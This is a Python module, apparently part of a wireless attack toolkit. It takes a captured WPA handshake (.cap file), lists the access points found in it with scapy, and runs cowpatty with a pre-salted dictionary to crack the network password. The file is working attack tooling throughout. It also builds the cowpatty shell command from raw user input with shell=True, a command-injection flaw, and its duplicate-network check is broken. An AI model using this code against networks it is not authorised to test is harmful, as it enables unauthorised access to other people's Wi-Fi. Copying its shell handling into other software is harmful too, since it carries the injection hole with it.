#!/usr/bin/env python
from __future__ import print_function
import subprocess, os, sys, time, re
from scapy.all import *

'''
This section of the program helps crack WPA encrpyted Wi-Fi network passwords
with the use of a salted dictionary file. The user is prompted for a .cap file
with the WPA handshake in it, then is prompted for the salted dictionary file.
The program uses cowpatty in order to run the salted dictionary file agains the
WPA handshake.

If there are any questions please email me at joejoejoey13@gmail.com.
'''
short_name = 'Pre-existing Salt'
disp_name = 'Crack WPA/WPA2 (w/salted dictionary)'
otype = 'Routine'
need = ['Where is your .cap file located: ', '\nWhat is the SSID you are ' \
		'going to go after: ', 'Where is your pre-salted dictionary file' \
		' located: ']
answers = []

# Main definition
def run():
	global answers; answers = []
	nets = []
	subprocess.call('clear', shell=True)
	i = 0
	while i < len(need):
		if i == 1:
# This section creates a list of Access Points found in the .cap file that has been provided			
			wait_timer('Processing your .cap file..')
# Opens the pcap file
			pkts = rdpcap(answers[0])
# For each packet in the pcap file
			for pkt in pkts:
# If the packet has a dot11 beacon in it grab the info and save it in the nets array (if not already saved)
				if pkt.haslayer(Dot11Beacon):
					if not pkt.getlayer(Dot11Beacon).info == '':
						netName = pkt.getlayer(Dot11Beacon).info
						netMAC = pkt.getlayer(Dot11).addr2
						if not netMAC in nets:
							nets.append(netName+' : '+netMAC)
			print('\nHere are your access points found in that .cap file...\n')
			for y in nets: print(y)
		ans = raw_input(need[i])
# This section removes quotes if a file was drag and dropped into the program				
		if ans.startswith("\'"): ans = ans[1:]
		if ans.endswith("\' "): ans = ans[:-2]
		if i == 0:
			bssid_check = ''
# If the users input is validated, then the answers is added to the answers array		
		if validate(ans, i, nets):
			answers.append(ans)
			i += 1

	wait_timer('Cracking with pre-salted dictionary file..')
# final command for salting the dictionary file
	try:
		subprocess.call("cowpatty -d %s -r %s -s %s" % (answers[2], \
									answers[0], answers[1]), shell=True)
		raw_input('Finsihed attempt on WPA crack with a pre-salted dictionary.' \
								'\nPress [Enter] to return to the main menu.')
		return
	except:
		raw_input("There was an error running the pre-salted list.\n " \
							"Please press [Enter] to return to the main menu.")
		return

# Definition that validates users input			
def validate(ans, i, nets):
	if i == 0:
		if os.path.isfile(ans) and ans.endswith(".cap"): return True
	if i == 1:
		if (re.match("([a-fA-F0-9]{2}[:|\-]?){6}", ans)):
			for x in nets: 
				if ans in x: return True
	if i == 2:
		if os.path.isfile(ans): return True
	return False

# Definition to print a wait timer
def wait_timer(on_what):
    sys.stdout.write(on_what)
    timer = 4
    while timer > 0:
        sys.stdout.write('.')
        sys.stdout.flush()
        time.sleep(0.25)
        timer -= 1